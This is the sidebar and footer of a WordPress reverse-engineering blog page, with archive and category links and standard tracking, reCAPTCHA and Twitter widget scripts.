	<li><a href='https://www.codereversing.com/archives/date/2021/10'>October 2021</a></li>
	<li><a href='https://www.codereversing.com/archives/date/2021/05'>May 2021</a></li>
	<li><a href='https://www.codereversing.com/archives/date/2017/03'>March 2017</a></li>
	<li><a href='https://www.codereversing.com/archives/date/2017/02'>February 2017</a></li>
	<li><a href='https://www.codereversing.com/archives/date/2015/12'>December 2015</a></li>
	<li><a href='https://www.codereversing.com/archives/date/2015/09'>September 2015</a></li>
	<li><a href='https://www.codereversing.com/archives/date/2015/08'>August 2015</a></li>
	<li><a href='https://www.codereversing.com/archives/date/2015/07'>July 2015</a></li>
	<li><a href='https://www.codereversing.com/archives/date/2015/06'>June 2015</a></li>
	<li><a href='https://www.codereversing.com/archives/date/2015/05'>May 2015</a></li>
	<li><a href='https://www.codereversing.com/archives/date/2015/04'>April 2015</a></li>
	<li><a href='https://www.codereversing.com/archives/date/2015/03'>March 2015</a></li>
	<li><a href='https://www.codereversing.com/archives/date/2015/01'>January 2015</a></li>
	<li><a href='https://www.codereversing.com/archives/date/2014/12'>December 2014</a></li>
	<li><a href='https://www.codereversing.com/archives/date/2014/11'>November 2014</a></li>
	<li><a href='https://www.codereversing.com/archives/date/2014/06'>June 2014</a></li>
	<li><a href='https://www.codereversing.com/archives/date/2014/05'>May 2014</a></li>
	<li><a href='https://www.codereversing.com/archives/date/2014/04'>April 2014</a></li>
	<li><a href='https://www.codereversing.com/archives/date/2013/12'>December 2013</a></li>
	<li><a href='https://www.codereversing.com/archives/date/2011/07'>July 2011</a></li>
	<li><a href='https://www.codereversing.com/archives/date/2011/06'>June 2011</a></li>
	<li><a href='https://www.codereversing.com/archives/date/2011/05'>May 2011</a></li>
	<li><a href='https://www.codereversing.com/archives/date/2011/04'>April 2011</a></li>
	<li><a href='https://www.codereversing.com/archives/date/2011/03'>March 2011</a></li>
	<li><a href='https://www.codereversing.com/archives/date/2011/02'>February 2011</a></li>
	<li><a href='https://www.codereversing.com/archives/date/2011/01'>January 2011</a></li>
			</ul>

			</li><li id="categories-2" class="widget widget_categories">Categories
			<ul>
					<li class="cat-item cat-item-7"><a href="https://www.codereversing.com/archives/category/crypto">Cryptography</a>
</li>
	<li class="cat-item cat-item-8"><a href="https://www.codereversing.com/archives/category/gamehacking">Game Hacking</a>
</li>
	<li class="cat-item cat-item-3"><a href="https://www.codereversing.com/archives/category/genx86">General x86</a>
</li>
	<li class="cat-item cat-item-4"><a href="https://www.codereversing.com/archives/category/genx8664">General x86-64</a>
</li>
	<li class="cat-item cat-item-11"><a href="https://www.codereversing.com/archives/category/nocode">NoCode</a>
</li>
	<li class="cat-item cat-item-9"><a href="https://www.codereversing.com/archives/category/programming">Programming</a>
</li>
	<li class="cat-item cat-item-5"><a href="https://www.codereversing.com/archives/category/reveng">Reverse Engineering</a>
</li>
	<li class="cat-item cat-item-1"><a href="https://www.codereversing.com/archives/category/uncategorized">Uncategorized</a>
</li>
			</ul>

			</li><li id="meta-2" class="widget widget_meta">Meta
		<ul>
						<li><a href="https://www.codereversing.com/wp-login.php">Log in</a></li>
			<li><a href="https://www.codereversing.com/feed">Entries feed</a></li>
			<li><a href="https://www.codereversing.com/comments/feed">Comments feed</a></li>

			<li><a href="https://wordpress.org/">WordPress.org</a></li>
		</ul>

		</li>
</ul>

</div>
<!-- end sidebar -->

<p class="credit"><!--34 queries. 0.054 seconds. --> <cite>Powered by <a href='http://wordpress.org/' title='Powered by WordPress, state-of-the-art semantic personal publishing platform.'><strong>WordPress</strong></a></cite></p>

</div>

            <script type="text/javascript">
            var sub = document.getElementById('submit');
            document.getElementById('recaptcha-submit-btn-area').appendChild (sub);
            document.getElementById('submit').tabIndex = 6;
            if ( typeof _recaptcha_wordpress_savedcomment != 'undefined') {
                document.getElementById('comment').value = 
                    _recaptcha_wordpress_savedcomment;
            }
            </script><script type="text/javascript" id="wp-statistics-tracker-js-extra">
/* <![CDATA[ */
var WP_Statistics_Tracker_Object = {"requestUrl":"https:\/\/www.codereversing.com\/wp-json\/wp-statistics\/v2","ajaxUrl":"https:\/\/www.codereversing.com\/wp-admin\/admin-ajax.php","hitParams":{"wp_statistics_hit":1,"source_type":"post","source_id":261,"search_query":"","signature":"3bafeea351323230b47262ec6c40356a","endpoint":"hit"},"onlineParams":{"wp_statistics_hit":1,"source_type":"post","source_id":261,"search_query":"","signature":"3bafeea351323230b47262ec6c40356a","endpoint":"online"},"option":{"userOnline":"1","consentLevel":"disabled","dntEnabled":false,"bypassAdBlockers":false,"isWpConsentApiActive":false,"trackAnonymously":false,"isPreview":false},"jsCheckTime":"60000"};
/* ]]> */
</script>
<script type="text/javascript" src="https://www.codereversing.com/wp-content/plugins/wp-statistics/assets/js/tracker.js?ver=14.11.2" id="wp-statistics-tracker-js"></script>
<script type="text/javascript" src="https://www.codereversing.com/wp-content/plugins/wp-syntax/js/wp-syntax.js?ver=1.2" id="wp-syntax-js-js"></script>
<script type="text/javascript" id="twttr_api_scripts_init-js-after">
/* <![CDATA[ */
!function(d,s,id) {
					var js,fjs=d.getElementsByTagName(s)[0];
					if (!d.getElementById(id)) {
						js=d.createElement(s);
						js.id=id;
						js.src="https://platform.twitter.com/widgets.js";
						fjs.parentNode.insertBefore(js,fjs);
					}
				}(document,"script","twitter-wjs")
/* ]]> */
</script>
</body>
</html>
<!-- Dynamic page generated in 0.054 seconds. -->
<!-- Cached page generated by WP-Super-Cache on 2024-11-15 12:37:18 -->

<!-- super cache -->